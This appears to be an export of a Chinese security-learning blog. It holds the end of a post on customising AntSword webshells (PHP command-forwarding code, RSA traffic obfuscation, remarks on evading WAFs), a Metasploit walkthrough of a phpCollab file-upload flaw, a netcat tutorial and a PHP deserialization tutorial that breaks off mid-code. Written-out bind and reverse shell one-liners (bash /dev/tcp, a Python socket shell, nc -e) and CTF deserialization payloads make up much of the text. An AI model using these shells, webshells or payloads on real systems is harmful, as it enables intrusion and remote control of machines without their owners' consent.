if(isset($_POST[&#39;command&#39;])){echo $_POST[&#39;command&#39;];}?&gt;&quot;/&gt;      &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php//header(&quot;Content-Type:text/html;charset=gb2312&quot;);class Lnng{    var $lnng;    function __destruct(){        $a = (&#39;!&#39;^&#39;@&#39;).&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;        //@$a($this-&gt;lnng);    }}$lnng = new Lnng();@$lnng-&gt;lnng = $_POST[&#39;command&#39;];//echo $_POST[&#39;command&#39;];$lnng = serialize($lnng);@$ip = $_POST[&#39;ip&#39;];//echo $ip;$data = array(&#39;lnng&#39;=&gt;$lnng);$requestBody = http_build_query($data);$context = stream_context_create([&#39;http&#39; =&gt; [&#39;method&#39; =&gt; &#39;POST&#39;, &#39;header&#39; =&gt; &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.&quot;Content-Length: &quot; . mb_strlen($requestBody), &#39;content&#39; =&gt; $requestBody]]);@$response = file_get_contents($ip, false, $context);echo iconv(&quot;GB2312&quot;,&quot;UTF-8&quot;,$response);//echo $response;?&gt;</code></pre><p><img src="/images/pasted-432.png" alt="upload successful"><br><img src="/images/pasted-433.png" alt="upload successful"></p><h2 id="解码器原理"><a href="#解码器原理" class="headerlink" title="解码器原理"></a>解码器原理</h2><pre><code>/** * php::base64解码器 * Create at: 2020/11/21 17:15:24 */&#39;use strict&#39;;module.exports = {  /**   * @returns {string} asenc 将返回数据base64编码   * 自定义输出函数名称必须为 asenc   * 该函数使用的语法需要和shell保持一致   */  asoutput: () =&gt; {    return `function asenc($out){      return @base64_encode($out);    }    `.replace(/\n\s+/g, &#39;&#39;);  },  /**   * 解码 Buffer   * @param {string} data 要被解码的 Buffer   * @returns {string} 解码后的 Buffer   */  decode_buff: (data, ext={}) =&gt; {    return Buffer.from(data.toString(), &#39;base64&#39;);  }}</code></pre><p>官方注释很清楚这里就不弄了，而且我觉得蚁剑自带的base64啥的解码器完全够用，流量的混淆根本没法猜，有随机的前缀后缀是你所传参的时候传过去的，所有我没整就过🐕了。</p><h2 id="蚁剑RSA"><a href="#蚁剑RSA" class="headerlink" title="蚁剑RSA"></a>蚁剑RSA</h2><p><img src="/images/pasted-228.png" alt="upload successful"><br>RSA一种基于密码学的非对称加密来混淆流量的方法，先用私钥对要加密的东西进行加密，然后用公钥解密，所以我们把公钥放入webshell里面，就可实现对流量的混淆<br>RSA的原理利用的是数论中的mod运算，不可破解的原因就是一个大数不易分解为两个素数的乘积，所以便可实现加解密。<br><img src="/images/pasted-229.png" alt="upload successful"><br>同样的RSA混淆流量对CTF的AWD模式也有好处，就是别人没法通过查看自己的webshell，来连接其他的人webshell，因为你如果能打下来不可能只种一个webshell<br>参考:<a href="https://xz.aliyun.com/t/4640" target="_blank" rel="noopener">先知社区_从0到1掌握AWD攻防之RSA必杀</a></p><p>蚁剑的RSA使用方式很简单<br>使用前提，目标要php开启ssl，这个也是这个加密方法的缺陷，不开启没法调用解密函数</p><p>开启openssl方法<br>打开iphp.ini<br>搜索extension=php_openssl.dll，把前面的分号取消,然后重启web服务<br>在编码器的位置<br><img src="/images/pasted-230.png" alt="upload successful"><br>然后创建一个<br><img src="/images/pasted-231.png" alt="upload successful"><br><img src="/images/pasted-232.png" alt="upload successful"><br>然后将这个位置的webshell上传，写入啥的弄到目标<br><img src="/images/pasted-233.png" alt="upload successful"><br>然后连接的时候选择你创建的编码器就好了，测试了一下，安全🐕和护卫神不拦截，D盾可以扫描出来但是危险等级不高。<br>对于AWDctf利用蚁剑作者针对RSA也加了一个方法<br>在RSA编码器的位置加入下面代码，什么作用呢，在awd中别人抓取你的webshell读取flag流量进行转发到其他服务器中也可以获得flag，所以这里设置时效为5秒，可以设置更短。</p><pre><code>data[&quot;_&quot;] = `if((time()-${parseInt((new Date().getTime())/1000)})&gt;5){die();};${data[&#39;_&#39;]}`;</code></pre><p><img src="/images/pasted-234.png" alt="upload successful"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/u/31536" target="_blank" rel="noopener">蚁剑改造过WAF系列</a></p><p><a href="https://xz.aliyun.com/u/20727" target="_blank" rel="noopener">蚁剑改造计划</a></p><p><a href="https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw" target="_blank" rel="noopener">学蚁致用</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一句话木马原理&quot;&gt;&lt;a href=&quot;#一句话木马原理&quot; class=&quot;headerlink&quot; title=&quot;一句话木马原理&quot;&gt;&lt;/a&gt;一句话木马原理&lt;/h2&gt;&lt;p&gt;一句话木马形如这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php @eval($_POST[pa
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="蚁剑改造" scheme="https://lnng.top/tags/%E8%9A%81%E5%89%91%E6%94%B9%E9%80%A0/"/>
    
  </entry>
  
  <entry>
    <title>学习安全一年总结</title>
    <link href="https://lnng.top/posts/ba80.html"/>
    <id>https://lnng.top/posts/ba80.html</id>
    <published>2020-11-04T13:38:00.000Z</published>
    <updated>2020-11-06T11:02:03.695Z</updated>
    
    <content type="html"><![CDATA[<h2 id="追寻"><a href="#追寻" class="headerlink" title="追寻"></a>追寻</h2><p>感觉黑阔很酷，志愿中报考了类似网络安全的专业，很荣幸被录取，然后在学长推荐下加入了校ctf工作室学习(感谢工作室学长们推荐和指点)</p><h2 id="执着"><a href="#执着" class="headerlink" title="执着"></a>执着</h2><p>然后在学长们教导下学习web安全:<br>c，c++，php，Python                  —学校基础课，也就会敲个成绩管理系统，留言板，最最基础爬虫，和没有用的Pygame小游戏(千万别学!!!)<br>DVWA<br>sql-labs                              —手注一遍(忘的也查不多了)，sqlmap还没学<br>upload-labs                       —过了一遍<br>xss-labs                            —过了一遍(beef没学)<br>文件包含php伪协议<br>php的反序列化，主要是对于ctf的(玩了一段ctf)<br>工具msf，nmap(看了一哈四舍五入等于没学)<br>wifi的入侵                        —看了一本书，其实也只是使用工具</p><h2 id="展望和思考"><a href="#展望和思考" class="headerlink" title="展望和思考"></a>展望和思考</h2><p>虽然在学长们的指导下，但学习网络安全中也浪费了蛮多的时间(关键我喜欢瞎折腾，不过是真有趣)，比如qq机器人，pygame，还有这个博客，都搞了蛮久的其实。感觉接下来应该把时间放在更有意义的事情上，还有一个错误的认识，之前想着要把东西都学完再操作，其实不是的，网络安全更注重实操(这个特别感谢学长的指点，不然可能还能要走更远的弯路)<br>后续学习小计划:<br>打打vulnhub<br>继续学习常见漏洞<br>学习代码审计<br>学习内网相关知识<br>学习脚本语言Python<br>sqlmap等工具，也尝试自己写点小工具(尽力吧!?)<br>希望再一年后看到博客的自己有所进步，最后，特别感谢工作室学长学姐指点教导。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;追寻&quot;&gt;&lt;a href=&quot;#追寻&quot; class=&quot;headerlink&quot; title=&quot;追寻&quot;&gt;&lt;/a&gt;追寻&lt;/h2&gt;&lt;p&gt;感觉黑阔很酷，志愿中报考了类似网络安全的专业，很荣幸被录取，然后在学长推荐下加入了校ctf工作室学习(感谢工作室学长们推荐和指点)&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="个人日常" scheme="https://lnng.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%B8%B8/"/>
    
    
      <category term="日记" scheme="https://lnng.top/tags/%E6%97%A5%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>msf的基本使用(一)</title>
    <link href="https://lnng.top/posts/84b8.html"/>
    <id>https://lnng.top/posts/84b8.html</id>
    <published>2020-10-31T09:39:00.000Z</published>
    <updated>2020-11-04T13:04:14.681Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透环境的搭建"><a href="#渗透环境的搭建" class="headerlink" title="渗透环境的搭建"></a>渗透环境的搭建</h2><p>phpcollab的下载:<a href="https://files.cnblogs.com/files/Lmg66/phpCollab-v2.5.1.zip" target="_blank" rel="noopener">phpCollab-v2.5.1.zip</a><br>解压到www目录,给www目录权限，因为这个漏洞需要写的权限<br><code>chmod 777 wwww</code></p><p>基本环境<br><img src="/images/pasted-100.png" alt="upload successful"></p><p>配置</p><p><code>mysql -u root -p                 ---进入数据库</code></p><p><code>create database msf               ---创建数据库名称为msf自己可以改</code></p><p>进入页面下拉，点上对勾，点setting，进入设置页面</p><p><img src="/images/pasted-101.png" alt="upload successful"><br>如果发出报错提醒，setting.php没有写的权限，尝试到includings文件夹中创建settings.php然后让他的权限为777，在重新配置。</p><h2 id="CVE-2017-6090基本原理"><a href="#CVE-2017-6090基本原理" class="headerlink" title="CVE-2017-6090基本原理"></a>CVE-2017-6090基本原理</h2><p>文件上传，漏洞点：<br>/phpcollab/clients/editclient.php文件的第63~70行</p><pre><code>$extension = strtolower( substr( strrchr($_FILES[&#39;upload&#39;][&#39;name&#39;], &quot;.&quot;) ,1) );        if(@move_uploaded_file($_FILES[&#39;upload&#39;][&#39;tmp_name&#39;], &quot;../logos_clients/&quot;.$id.&quot;.$extension&quot;))         {            chmod(&quot;../logos_clients/&quot;.$id.&quot;.$extension&quot;,0666);            $tmpquery = &quot;UPDATE &quot;.$tableCollab[&quot;organizations&quot;].&quot; SET extension_logo=&#39;$extension&#39; WHERE id=&#39;$id&#39;&quot;;            connectSql(&quot;$tmpquery&quot;);        }</code></pre><p>$extension = strtolower( substr( strrchr($_FILES[‘upload’][‘name’], “.”) ,1) );这里获得了小写的文件后缀名没有经过过滤<br>move_uploaded_file($_FILES[‘upload’][‘tmp_name’], “../logos_clients/“.$id.”.$extension”)中直接id+后缀使用<br>所有我们可以上传php文件，也不会被更改后缀名，直接上传一句话木马，蚁剑连接，原理很简单</p><p><img src="/images/pasted-102.png" alt="upload successful"></p><p><img src="/images/pasted-103.png" alt="upload successful"></p><h2 id="msf的基本命令"><a href="#msf的基本命令" class="headerlink" title="msf的基本命令"></a>msf的基本命令</h2><p><img src="/images/pasted-104.png" alt="upload successful"><br>msfconsole的连接shell后的命令</p><p><img src="/images/pasted-105.png" alt="upload successful"></p><h2 id="msf的基本使用-CVE-2017-6090"><a href="#msf的基本使用-CVE-2017-6090" class="headerlink" title="msf的基本使用(CVE-2017-6090)"></a>msf的基本使用(CVE-2017-6090)</h2><p>初始化并启动msf的数据库</p><pre><code>msfdb initmsfdb start</code></pre><p>msfconsole的数据库的命令</p><pre><code>msfdb init      启动并初始化数据库msfdb reinit       删除并重新初始化数据库msfdb delete      删除数据库并停止使用msfdb start        启动数据库msfdb stop        停止数据库msfdb status      检查服务状态msfdb run         启动数据库并运行msf</code></pre><p>建立一次扫描(CVE-2017-6090)</p><p><img src="/images/pasted-106.png" alt="upload successful"></p><h2 id="参考文章及说明"><a href="#参考文章及说明" class="headerlink" title="参考文章及说明"></a>参考文章及说明</h2><p>《精通metasploite渗透测试(第3版)》<br>说明：本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透环境的搭建&quot;&gt;&lt;a href=&quot;#渗透环境的搭建&quot; class=&quot;headerlink&quot; title=&quot;渗透环境的搭建&quot;&gt;&lt;/a&gt;渗透环境的搭建&lt;/h2&gt;&lt;p&gt;phpcollab的下载:&lt;a href=&quot;https://files.cnblogs.com/fi
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://lnng.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="文件上传" scheme="https://lnng.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="msf" scheme="https://lnng.top/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>netcat的使用</title>
    <link href="https://lnng.top/posts/f724.html"/>
    <id>https://lnng.top/posts/f724.html</id>
    <published>2020-10-16T13:26:00.000Z</published>
    <updated>2020-10-16T13:42:59.972Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>nc被誉为网络安全界的瑞士军刀，一个简单而有用的工具，通过使用TCP或UDP协议的网络连接去读写数据。</p><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p>windows下下载地址:<a href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener">https://eternallybored.org/misc/netcat/</a><br>下载解压将nc.exe 复制到C:\Windows\System32的文件夹下cmd命令nc即可(也可以配环境变量)<br>linux下:管理员权限下<code>apt-get install netcat</code>，命令行nc查看是否安装成功</p><h2 id="netcat基本使用"><a href="#netcat基本使用" class="headerlink" title="netcat基本使用"></a>netcat基本使用</h2><p><img src="/images/pasted-84.png" alt="upload successful"></p><h2 id="netcat文件交互"><a href="#netcat文件交互" class="headerlink" title="netcat文件交互"></a>netcat文件交互</h2><p>创建一个服务器端方法：<br><code>nc -l -p</code><br>创建一个客户端方法(连接服务器端)<br><code>nc [remote_addr] [remoteport]</code></p><p><img src="/images/pasted-85.png" alt="upload successful"></p><p><img src="/images/pasted-86.png" alt="upload successful"></p><h2 id="netcat文件传输"><a href="#netcat文件传输" class="headerlink" title="netcat文件传输"></a>netcat文件传输</h2><p>创建服务器端：<br><code>nc -l -p 4444 &gt; outfile.txt</code><br>其中outfile.txt是要接受到的文件<br>创建客户端:<br><code>nc 192.168.124.133 4444 &lt; game.pcapng</code><br>其中game.pacpng是要发送的文件<br>其中如果服务端并没有准备好连接，而客户端已经使用nc进行连接，那么客户端会一直等待，直到连接上服务器，造成’假死’状态.<br>解决方法:设置等待时间<br><code>nc -w 3 [ip] [port]               设置等待时间3秒，超过3秒钟，客户端直接关闭等待连接。</code><br>netcat信息探测<br>端口扫描使用</p><pre><code>nc -v -n -z -w1 [target_ip] [start_target_port-stop_target_port]nc -v -n -z -w1 192.168.124.133 1-1000</code></pre><p>好吧这个不和nmap一样蛮，其实和nmap是一个作者都利用tcp/ip来判断</p><p><img src="/images/pasted-87.png" alt="upload successful"></p><h2 id="netcat建立后门"><a href="#netcat建立后门" class="headerlink" title="netcat建立后门"></a>netcat建立后门</h2><h3 id="监听型后门"><a href="#监听型后门" class="headerlink" title="监听型后门"></a>监听型后门</h3><p>创建服务器端:</p><pre><code>ncat -l -e /bin/bash -p 4444</code></pre><p><code>-e 连接后执行执行某文件</code><br>其中/bin/bash是linux的shell解释器，连接后执行该文件，如果是windows要用来命令执行<br><code>ncat -l -e cmd.exe -p 4444</code><br>客户端连接:执行命令<br><code>nc -w 10 192.168.124.133 4444</code></p><p><img src="/images/pasted-88.png" alt="upload successful"></p><h3 id="连接型后门"><a href="#连接型后门" class="headerlink" title="连接型后门"></a>连接型后门</h3><p>服务器端:<br><code>nc -l -p 4444</code><br>连接端<br><code>nc [remote_ip] [remote_port] -e /bin/bash</code><br>windows下使用-e cmd.exe<br><code>ncat 192.168.124.133 4444 -e /bin/bash</code></p><p><img src="/images/pasted-89.png" alt="upload successful"></p><h2 id="netcat反弹shell-bash"><a href="#netcat反弹shell-bash" class="headerlink" title="netcat反弹shell(bash)"></a>netcat反弹shell(bash)</h2><p>反弹shell命令：<br><code>bash -I &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>pc接受netcat命令:<br><code>nc -lvp port</code></p><p><img src="/images/pasted-90.png" alt="upload successful"></p><p><img src="/images/pasted-91.png" alt="upload successful"></p><h2 id="netcat反弹shell-python"><a href="#netcat反弹shell-python" class="headerlink" title="netcat反弹shell(python)"></a>netcat反弹shell(python)</h2><p>服务器端：<br><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.124.133&#39;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code><br>客户端:<br><code>nc -l -p 4444</code></p><p><img src="/images/pasted-92.png" alt="upload successful"></p><p><img src="/images/pasted-93.png" alt="upload successful"></p><p><img src="/images/pasted-94.png" alt="upload successful"><br>首先使用socket与远程建立连接，具有了远程的文件描述符，可以使用s.fileno()来查看具体套接字建立的远程文件描述符。</p><p>os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，使用os的subprocess在本地开启了一个子进程，传入参数”-i” 使 bash 以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样就可以实现反弹shell.</p><h2 id="netcat反弹shell-不支持-e"><a href="#netcat反弹shell-不支持-e" class="headerlink" title="netcat反弹shell(不支持 -e)"></a>netcat反弹shell(不支持 -e)</h2><p>反弹shell命令：<br><code>nc ip port | /bin/bash | nc ip port</code><br>用管道来重新定向输入和输出<br>pc接受netcat命令<br><code>nc -l -p</code> 需要启动两个监听端口<br>其中一个作为输入，一个作为输出</p><p><img src="/images/pasted-95.png" alt="upload successful"></p><p><img src="/images/pasted-96.png" alt="upload successful"></p><h2 id="一个ncshell生成加密小工具-shellpy"><a href="#一个ncshell生成加密小工具-shellpy" class="headerlink" title="一个ncshell生成加密小工具(shellpy)"></a>一个ncshell生成加密小工具(shellpy)</h2><p>地址：<a href="https://github.com/DarkSecDevelopers/Shellpy" target="_blank" rel="noopener">https://github.com/DarkSecDevelopers/Shellpy</a></p><p><img src="/images/pasted-97.png" alt="upload successful"></p><p><img src="/images/pasted-98.png" alt="upload successful"><br>加密方法链接：<a href="https://github.com/pyca/cryptography/blob/master/src/cryptography/fernet.py" target="_blank" rel="noopener">https://github.com/pyca/cryptography/blob/master/src/cryptography/fernet.py</a><br>使用方法修改ip和端口运行run.py，运行shell.exe<br>其中shell.py是经过加密的</p><p><img src="/images/pasted-99.png" alt="upload successful"></p><h2 id="参考文章及说明"><a href="#参考文章及说明" class="headerlink" title="参考文章及说明"></a>参考文章及说明</h2><p>国光大佬:<a href="https://www.sqlsec.com/2019/10/nc.html" target="_blank" rel="noopener">https://www.sqlsec.com/2019/10/nc.html</a><br>小玉大佬:<a href="https://www.bilibili.com/video/BV1KZ4y1L7NZ" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1KZ4y1L7NZ</a><br>最后欢迎访问我的个人博客：<a href="https://lmg66.github.io/">https://lmg66.github.io/</a><br>说明：本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;nc被誉为网络安全界的瑞士军刀，一个简单而有用的工具，通过使用TCP或UDP协议的网络连接去读写数据。&lt;/p&gt;
&lt;h2 id=&quot;下载安装&quot;&gt;
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://lnng.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="netcat" scheme="https://lnng.top/tags/netcat/"/>
    
  </entry>
  
  <entry>
    <title> php反序列化漏洞 </title>
    <link href="https://lnng.top/posts/d8e5.html"/>
    <id>https://lnng.top/posts/d8e5.html</id>
    <published>2020-10-06T12:13:00.000Z</published>
    <updated>2020-10-06T12:43:34.890Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文总结php的反序列化，有php反序列字符串逃逸，php反序列化pop链构造，php反序列化原生类的利用，phar反序列化，session反序列化，反序列化小技巧，并附带ctf小题来说明，还有php反序列化的预防方法(个人想法)，建议按需查看，如有错误还望斧正。<br>如非特别说明运行环境为PHP 7.2.33-1+ubuntu18.04.1</p><h2 id="为什么要序列化？"><a href="#为什么要序列化？" class="headerlink" title="为什么要序列化？"></a>为什么要序列化？</h2><p>序列化可以将对象，类，数组，变量，匿名函数等，转换为字符串，这样用户就方便存储和传输，同时方便恢复使用，对服务器也减轻一定的压力。</p><h2 id="序列化基础"><a href="#序列化基础" class="headerlink" title="序列化基础"></a>序列化基础</h2><p>序列化为字符串时候，变量和参数之间用；隔开，同一个变量和参数间用：号隔开，以}作为结尾，具体结构，用以下代码来看下结构</p><pre><code>&lt;?phpclass Lmg{    public $name = &#39;Lmg&#39;;    public $age = 19;    public $blog = &#39;https://lmg66.github.io&#39;;}$lmg1 = new Lmg;echo serialize($lmg1).&quot;\n&quot;;?&gt;</code></pre><p><img src="/images/pasted-35.png" alt="upload successful"></p><h2 id="序列化属性"><a href="#序列化属性" class="headerlink" title="序列化属性"></a>序列化属性</h2><h3 id="在一个可以序列化的字符串后加其他参数不影响序列化后的结果"><a href="#在一个可以序列化的字符串后加其他参数不影响序列化后的结果" class="headerlink" title="在一个可以序列化的字符串后加其他参数不影响序列化后的结果"></a>在一个可以序列化的字符串后加其他参数不影响序列化后的结果</h3><p>如：<br>测试代码：</p><pre><code>&lt;?phpclass Lmg{    public $name = &#39;Lmg&#39;;    public $age = 19;    public $blog = &#39;https://lmg66.github.io&#39;;}$lmg1 = new Lmg;echo serialize($lmg1).&quot;\n&quot;;$Lmg2 = serialize($lmg1).&#39;s:4:&quot;blog&quot;;s:23:&quot;https://lmg66.github.io&quot;;}&#39;;echo $Lmg2.&quot;\n&quot;;print_r($lmg1);print_r(unserialize($Lmg2));?&gt;</code></pre><p>效果：可以发现，后面加了其他参数并不影响序列化后的结果</p><p><img src="/images/pasted-36.png" alt="upload successful"></p><h3 id="显示变量长度和实际长度不匹配就会报错，在这里在某些情况就会产生字符串逃逸"><a href="#显示变量长度和实际长度不匹配就会报错，在这里在某些情况就会产生字符串逃逸" class="headerlink" title="显示变量长度和实际长度不匹配就会报错，在这里在某些情况就会产生字符串逃逸"></a>显示变量长度和实际长度不匹配就会报错，在这里在某些情况就会产生字符串逃逸</h3><p>如：<br>测试代码：</p><pre><code>&lt;?phpclass Lmg{    public $name = &#39;Lmg&#39;;    public $age = 19;    public $blog = &#39;https://lmg66.github.io&#39;;}$lmg4 = &#39;O:3:&quot;Lmg&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;Lmg&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:23:&quot;https://lmg66.github.io&quot;;}&#39;;$lmg5 = &#39;O:3:&quot;Lmg&quot;:3:{s:4:&quot;uname&quot;;s:3:&quot;Lmg&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:23:&quot;https://lmg66.github.io&quot;;}&#39;;print_r(unserialize($lmg4));print_r(unserialize($lmg5));?&gt;</code></pre><p>效果：可以发现我改了变量名name使它的长度和实际4不符，就发生了报错，改其他类似</p><p><img src="/images/pasted-37.png" alt="upload successful"></p><h3 id="反序列常见魔术函数总览，可构造pop链"><a href="#反序列常见魔术函数总览，可构造pop链" class="headerlink" title="反序列常见魔术函数总览，可构造pop链"></a>反序列常见魔术函数总览，可构造pop链</h3><pre><code>__construct： 当创建类的时候自动调用，也就是构造函数，无返回值__destruct： 当类实例子销毁时候自动调用，也就是析构函数，无返回值，其不能带参数__toString：当对象被当做一个字符串使用时调用，比如echo $obj 。__sleep： 当类的实例被序列化时调用(其返回需要一个数组或者对象，一般返回对象的$this,返回的值被用来做序列化的值，如果不返回，表示序列化失败)__wakeup: 当反序列化时被调用__call:当调用对象中不存在的方法会自动调用该方法。__get:在调用私有属性的时候会自动执行__isset()在不可访问的属性上调用isset()或empty()触发__unset()在不可访问的属性上使用unset()时触发</code></pre><h2 id="反序列化字符串逃逸-替换后导致字符串变长"><a href="#反序列化字符串逃逸-替换后导致字符串变长" class="headerlink" title="反序列化字符串逃逸(替换后导致字符串变长)"></a>反序列化字符串逃逸(替换后导致字符串变长)</h2><p>字符串逃逸利用的是反序列化的属性如上文，出现原因是在序列化前进行了字符串的替换，导致字符串被拓冲，可以将后面的字符串挤出去，挤到后一个对象的变量从而改变其他的变量值，造成逃逸。<br>如：<br>测试代码：</p><pre><code>&lt;?phpfunction filter($str){    return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);}class A{    public $name=&#39;aaaa&#39;;    public $pass=&#39;123456&#39;;}$AA=new A();echo serialize($AA).&quot;\n&quot;;$res=filter(serialize($AA));$c=unserialize($res);echo $c-&gt;pass;?&gt;</code></pre><p>序列化后的字符串为：<br><code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;}</code><br>如果能让name变量的参数为<br><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hack&quot;;}</code><br>用}号闭合掉后面的pass参数，就能改pass变量的参数值从而逃逸<br>要解决的就是这个位置的长度问题，只用读取到足够的长度，才会停止</p><p><img src="/images/pasted-38.png" alt="upload successful"><br>可以发现在序列化进行了字符串的替换，但替换的时候bb替换成了ccc，也就是字符串变长了，达到我们上面想要的目的</p><p><img src="/images/pasted-39.png" alt="upload successful"><br>先判断想要构造的字符串长度</p><pre><code>&lt;?php$lmg = &#39;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hack&quot;;}&#39;;echo strlen($lmg).&quot;\n&quot;;// $lmg3 = &quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;// echo strlen($lmg3);// $lmg2 = &quot;bb&quot;;// echo str_repeat($lmg2, 25);?&gt;</code></pre><p>运行长度为25，一个bb换成ccc，就逃逸1个字符，也就是说需要25个bb才能将后面的字符串给挤出来</p><pre><code>&lt;?php// $lmg = &#39;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hack&quot;;}&#39;;// echo strlen($lmg).&quot;\n&quot;;// $lmg3 = &quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;// echo strlen($lmg3);$lmg2 = &quot;bb&quot;;echo str_repeat($lmg2, 25);?&gt;</code></pre><p>将name变量参数变为25个bb+”;s:4:”pass”;s:6:”hack”;}<br>测试代码：</p><pre><code>&lt;?phpfunction filter($str){    return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);}class A{    public $name=&#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:4:&quot;hack&quot;;}&#39;;    public $pass=&#39;123456&#39;;}$AA=new A();// echo serialize($AA).&quot;\n&quot;;print_r($AA);$res=filter(serialize($AA));echo $res.&quot;\n&quot;;$c=unserialize($res);print_r($c);// echo $c-&gt;pass.&quot;\n&quot;;?&gt;</code></pre><p>运行结果：构造完的字符串，反序列化后发现密码被改为了hack，而我们并未直接修改pass的参数，从而实现字符串的逃逸</p><p><img src="/images/pasted-40.png" alt="upload successful"></p><h3 id="一个ctf例题-0CTF-2016-piapiapia"><a href="#一个ctf例题-0CTF-2016-piapiapia" class="headerlink" title="一个ctf例题([0CTF 2016]piapiapia)"></a>一个ctf例题([0CTF 2016]piapiapia)</h3><p>地址：<a href="https://buuoj.cn/challenges#[0CTF%202016]piapiapia" target="_blank" rel="noopener">https://buuoj.cn/challenges#[0CTF%202016]piapiapia</a><br>打开题目扫描一下发现w<a href="http://www.zip文件下载，因为本文主要交php反序化就不绕了" target="_blank" rel="noopener">www.zip文件下载，因为本文主要交php反序化就不绕了</a><br>发现config.php中又flag，所以要读取文件，在profile.php中发现读取文件的代码</p><pre><code>else {        $profile = unserialize($profile);        $phone = $profile[&#39;phone&#39;];        $email = $profile[&#39;email&#39;];        $nickname = $profile[&#39;nickname&#39;];        $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></pre><p>如果能让photo为config.php，而这数值来自$profile的反序列化，查看$profile</p><pre><code>public function update_profile($username, $new_profile) {        $username = parent::filter($username);        $new_profile = parent::filter($new_profile);        $where = &quot;username = &#39;$username&#39;&quot;;        return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);    }</code></pre><p>发现有过滤</p><pre><code>public function filter($string) {        $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);        $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;        $string = preg_replace($escape, &#39;_&#39;, $string);        $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);        $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;        return preg_replace($safe, &#39;hacker&#39;, $string);    }</code></pre><p>要进行字符串的逃逸应该先考虑用nickname来构造字符串逃逸photo应为nickname在其前面<br>然后发现nickname有正则过滤，考虑用数组来进行绕过</p><pre><code>if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)            die(&#39;Invalid nickname&#39;);</code></pre><p>数组绕过后就考虑进行逃逸将photo挤出去<br>所以我们需要构造nickname的参数值为”;}s:5:”photo”;s:10:”config.php”;}<br>这里为什么要在前面加一个}呢？？？，因为为了绕过nickname的正则匹配我们将其构造成了数组，数组在反序列化要进行闭合，可以尝试一下<br>构造代码</p><pre><code>&lt;?phpfunction filter($str){    return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);}class A{    public $name=&#39;aaaa&#39;;    public $pass=&#39;123456&#39;;    public $nickname = array(&#39;a&#39; =&gt; &#39;Apple&#39; ,&#39;b&#39; =&gt; &#39;banana&#39; , &#39;c&#39; =&gt; &#39;Coconut&#39;);}$AA=new A();echo serialize($AA).&quot;\n&quot;;// 